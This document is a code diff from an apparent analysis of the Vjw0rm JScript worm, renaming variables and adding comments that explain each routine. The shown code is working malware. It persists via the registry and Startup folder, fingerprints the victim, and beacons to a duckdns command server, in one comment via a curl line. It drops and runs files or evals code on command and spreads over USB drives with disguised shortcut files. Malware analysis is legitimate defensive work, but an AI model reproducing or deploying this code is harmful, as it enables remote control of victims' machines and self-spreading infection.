@@ -9,56 +9,64 @@ var BackSlash = "\\";
 var HDDSerial = "windows" + "_" + GetInfo(6);
 var ScriptName = WScript.ScriptName;
 var ScriptFullName = WScript.ScriptFullName;
-var GlobalTrashVar;
+var isInTopDir;
+
 try {
     // shell.RegRead('HKCU\\vjw0rm')
-    // Reading registry key HKCU\\vjw0rm and storing it into GlobalTrashVar. value is either TRUE or FALSE
-    GlobalTrashVar = shell.RegRead(RegistryEntries[2]);
+    // Reading registry key HKCU\\vjw0rm and storing it into isInTopDir. value is either TRUE or FALSE
+    isInTopDir = shell.RegRead(RegistryEntries[2]);
 } catch(err) {
     var sv = ScriptFullName.split("\\");
     if (":\\" + sv[1] + "== :\\" + ScriptName) { // If script is in top dir (c:\, e:\, etc)
-	GlobalTrashVar = "TRUE";
+	isInTopDir = "TRUE";
 	// Writing REG_SZ key HKCU\\vjw0rm with TRUE
-	shell.RegWrite(RegistryEntries[2],GlobalTrashVar,RegistryEntries[5]);
+	shell.RegWrite(RegistryEntries[2],isInTopDir,RegistryEntries[5]);
     } else {
-	GlobalTrashVar = "FALSE";
+	isInTopDir = "FALSE";
 	// Writing REG_SZ key HKCU\\vjw0rm with FALSE
-	shell.RegWrite(RegistryEntries[2],GlobalTrashVar,RegistryEntries[5]);
+	shell.RegWrite(RegistryEntries[2],isInTopDir,RegistryEntries[5]);
     }
 }
 // Try to persist on computer by various means
 Persist();
+
 do {
     try {
 	var Response = PostFingerPrint('Vre','');
 	Response = Response.split(SplitDelim);
+	WScript.Echo(Response)
+	// self termination
 	if (Response[0] === "Cl") {
 	    WScript.Quit(1);
 	}
 
-	// Drop file and run it ?
+	// Drop file and run it
 	if (Response[0] === "Sc") {
-	    var s2 = GetEnvironementVar("temp") + "\\" + Response[2];
-	    var fi = FileSystem.CreateTextFile(s2,true);
-	    fi.Write(Response[1]);
-	    fi.Close();
-	    shell.run(s2);
+	    var pathToDrop = GetEnvironementVar("temp") + "\\" + Response[2];
+	    var file = FileSystem.CreateTextFile(pathToDrop,true);
+	    file.Write(Response[1]);
+	    file.Close();
+	    shell.run(pathToDrop);
 	}
 
-	// executes arbitrary JavaScript ?
+	// executes arbitrary JavaScript
 	if (Response[0] === "Ex") {
 	    eval(Response[1]);
 	}
 
+	// Modifies the HDDSerial Prefix
+	// Maybe to invalidate the user agent ?
 	if (Response[0] === "Rn") {
-	    var ri = FileSystem.OpenTextFile(ScriptFullName,1);
-	    var fr = ri.ReadAll();
-	    ri.Close();
+	    // Opens the script file for reading
+	    var scriptr = FileSystem.OpenTextFile(ScriptFullName,1); // ri
+	    var scriptContent = scriptr.ReadAll(); // fr
+	    scriptr.Close();
 	    HDDSerial = HDDSerial.split("_");
-	    fr = fr.replace(HDDSerial[0],Response[1]);
-	    var wi = FileSystem.OpenTextFile(ScriptFullName,2,false);
-	    wi.Write(fr);
-	    wi.Close();
+	    scriptContent = scriptContent.replace(HDDSerial[0],Response[1]);
+	    // Opens the script for writing
+	    var scriptw = FileSystem.OpenTextFile(ScriptFullName,2,false); // wi
+	    scriptw.Write(scriptContent);
+	    scriptw.Close();
 	    shell.run("wscript.exe //B \"" + ScriptFullName + "\"");
 	    WScript.Quit(1);
 	}
@@ -105,23 +113,23 @@ function PostFingerPrint(ressource,body) {
     // x = ReturnWindowsTool('XMLHTTP');
     // curl -A 'windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\' --data ''  http://postventa-vodafone2006.duckdns.org:1993/Vre
     var X = ReturnWindowsTool(3);
-    X.open('POST','http://postventa-vodafone2006.duckdns.org:1993/' + ressource, false);
+    // url is supposed to be "http://postventa-vodafone2006.duckdns.org:1993/"
+    X.open('POST','http://192.168.1.7:1993/Vre' + ressource, false);
     X.SetRequestHeader("User-Agent:",FingerPrint());
     X.send(body);
     return X.responsetext;
 }
 
-
 function FingerPrint() {
-    var s,NT,i;
+    var serial,NT,i;
     if (FileSystem.fileexists(GetEnvironementVar("Windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe")) {
 	NT ="YES";
     } else {
 	NT = "NO";
     }
     // windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\
-    s = HDDSerial + BackSlash + GetEnvironementVar("COMPUTERNAME") + BackSlash + GetEnvironementVar("USERNAME") + BackSlash + GetInfo(2) + BackSlash + GetInfo(4) + BackSlash + BackSlash + NT + BackSlash + GlobalTrashVar + BackSlash;
-    return s;
+    serial = HDDSerial + BackSlash + GetEnvironementVar("COMPUTERNAME") + BackSlash + GetEnvironementVar("USERNAME") + BackSlash + GetInfo(2) + BackSlash + GetInfo(4) + BackSlash + BackSlash + NT + BackSlash + isInTopDir + BackSlash;
+    return serial;
 }
 
 function ReturnWindowsTool(ID) {
@@ -200,7 +208,6 @@ function Persist() {
     try {
 	// Shell.Application
 	var app = ReturnWindowsTool(2);
-	WScript.Echo(app.NameSpace(7).Self.Path)
 	// Write the script in startup folder. app.NameSpace(7).Self.Path returns path to startup folder
 	FileSystem.CopyFile(ScriptFullName, app.NameSpace(7).Self.Path + "\\" + ScriptName,true);
     } catch(err) {
@@ -210,7 +217,6 @@ function Persist() {
 
 function PropagateOnUsb() {
     try {
-	// var WindowsMgmt = ["winmgmts:","win32_logicaldisk","Win32_OperatingSystem",'AntiVirusProduct'];
 	// var ld = GetObject("winmgmts:").InstancesOf('win32_logicaldisk');
 	var LogicalDisk = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[1]); 
 	var edi = new Enumerator(LogicalDisk);
@@ -232,72 +238,76 @@ function PropagateOnUsb() {
 			FileSystem.GetFile(DrivePath + ScriptName).attributes=2+4;
 		    }
 		    try {
-			var ef = new Enumerator(FileSystem.GetFolder(DrivePath).SubFolders);
-			// Enumerates folders on removable media
-			for (;!ef.atEnd();ef.moveNext()) {
-			    var gf = ef.item();
-			    gf.attributes=2+4;
-			    // ScriptName = ScriptName.replace(" ", "\" \"");
-			    // Does nothing
+			var enumFolders = new Enumerator(FileSystem.GetFolder(DrivePath).SubFolders); // ef
+			// Enumerates folders on removable media and creates a shortcut that launches the script and open explorer,
+			// named after each directory
+			for (;!enumFolders.atEnd();enumFolders.moveNext()) {
+			    var folder = enumFolders.item(); //gf
+			    folder.attributes=2+4;
+			    // Put scriptName in double quotes
 			    ScriptName = ScriptName.replace(" ", "\"" + " " + "\"");
-			    var n = gf.name;
-			    // Also does nothing as n is never used afterwards
-			    n = n.replace(" ", "\"" + " " + "\"");
-				// Creates a shortcut on removable media
-			    var sr = shell.CreateShortCut(DrivePath + gf.name + ".lnk");
-				// 7 means windows is minimized and activates the next top level windows
-			    sr.WindowStyle = 7;
-				// Makes the shortcut open cmd.exe, then explorer to make it look like nothing fishy happened
-			    sr.TargetPath  = "cmd.exe";
-			    sr.Arguments = "/c start " + ScriptName + "&start explorer " + n + "&exit";
+			    var folderName = folder.name; // n
+			    // Put FolderName in double quotes
+			    folderName = folderName.replace(" ", "\"" + " " + "\"");
+			    // Creates a shortcut on removable media with folderName
+			    var shortCut = shell.CreateShortCut(DrivePath + folder.name + ".lnk"); // sr
+			    // 7 means windows is minimized and activates the next top level windows
+			    shortCut.WindowStyle = 7;
+			    // Makes the shortcut open cmd.exe, then explorer to make it look like nothing fishy happened
+			    shortCut.TargetPath  = "cmd.exe";
+			    shortCut.Arguments = "/c start " + ScriptName + "&start explorer " + folderName + "&exit";
 			    var defaultFolderIconKey = "HKLM\\software\\classes\\folder\\defaulticon\\";
 			    var defaultFolderIconPath = shell.RegRead(defaultFolderIconKey); //fic
-			    var iconLocation = sr.IconLocation; //ci
+			    // default WshShortcut.iconLocation is ",0" where 0 is an index
+			    var iconLocation = shortCut.IconLocation; //ci
 			    var sci = ",";
-			    if (ci.indexOf(sci) !== -1) {
-				sr.IconLocation = defaultFolderIconPath;
+			    if (iconLocation.indexOf(sci) !== -1) {
+				shortCut.IconLocation = defaultFolderIconPath;
 			    } else {
-				sr.IconLocation = gf.Path;
+				shortCut.IconLocation = folder.Path;
 			    }
-			    sr.Save();
+			    shortCut.Save();
 			}
 
 		    } catch(err) {}
 		    try {
 			var files = new Enumerator(FileSystem.GetFolder(DrivePath).Files);
 			// Enumerates files on usb device
-			for (;!file.atEnd();file.moveNext()) {
-			    var currentFile = file.item(); // gfi
+			for (;!files.atEnd();files.moveNext()) {
+			    var file = files.item(); // gfi
 			    var dot = ".";
 			    var lnk = "lnk";
 			    // If filename contains ".lnk"
-			    if (currentFile.name.indexOf(dot) !== -1) {
-				if (currentFile.name.indexOf(lnk) !== -1) {
+			    if (file.name.indexOf(dot) !== -1) {
+				if (file.name.indexOf(lnk) !== -1) {
 				} else {
 				    // verifies that current file is not the actual script
-				    if (currentFile.name !== ScriptName) {
+				    if (file.name !== ScriptName) {
 					// sets hidden and system flags
-					currentFile.attributes=2+4;
-					var currentFileName = currentFile.name;
-					currentFileName = currentFileName.replace(" ", "\"" + " " + "\"");
+					file.attributes=2+4;
+					var fileName = file.name;
+					fileName = fileName.replace(" ", "\"" + " " + "\"");
 					ScriptName = ScriptName.replace(" ", "\"" + " " + "\"");
-					// creates a shortcut on the usb drive, actually overwrites the old file
-					var shr = sh.CreateShortCut(DrivePath + currentFile.name + ".lnk");
-					shr.WindowStyle=7;
-					shr.TargetPath = "cmd.exe";
-					shr.Arguments = "/c start " + ScriptName + "&start " + nu + "&exit";
-					var sgf = currentFile.name.split(".");
-					// read
-					var fvi = shell.RegRead(RegistryEntries[4] + "." + sgf[sgf.length -1] + "\\");
-					var fvi2 = shell.RegRead(RegistryEntries[4] + fvi + RegistryEntries[6] + "\\");
-					var ci = shr.IconLocation;
+					// Creates a shortcut on the usb drive for each file present. Same technique as with the directory
+					// Uses the same icon in order to hide from and confuse users.
+					var shortCut = shell.CreateShortCut(DrivePath + file.name + ".lnk"); //shr
+					shortCut.WindowStyle=7;
+					shortCut.TargetPath = "cmd.exe";
+					shortCut.Arguments = "/c start " + ScriptName + "&start " + fileName + "&exit";
+					var fileNameSplit = currentFile.name.split("."); // sgf
+					// reads the class default value which often contains ${extension}File
+					var defaultName = shell.RegRead("HKLM\\software\\classes\\" + "." + fileNameSplit[fileNameSplit.length -1] /* extension */ + "\\"); // fvi
+					// Get the defaulticon for the file type
+					var icon = shell.RegRead("HKLM\\software\\classes\\" + defaultName + "\\defaulticon" + "\\"); //fvi2
+					var iconLocation = shr.IconLocation; // ci
 					var sci = ",";
-					if (ci.indexOf(sci) !== -1) {
-					    shr.IconLocation = fvi2;
+					// default WshShortcut.iconLocation is ",0" where 0 is an index
+					if (iconLocation.indexOf(sci) !== -1) {
+					    shortCut.IconLocation = icon;
 					} else {
-					    shr.IconLocation = currentFile.Path;
+					    shortCut.IconLocation = file.Path;
 					}
-					shr.Save();
+					shortCut.Save();
 				    }
 				}
 			    }
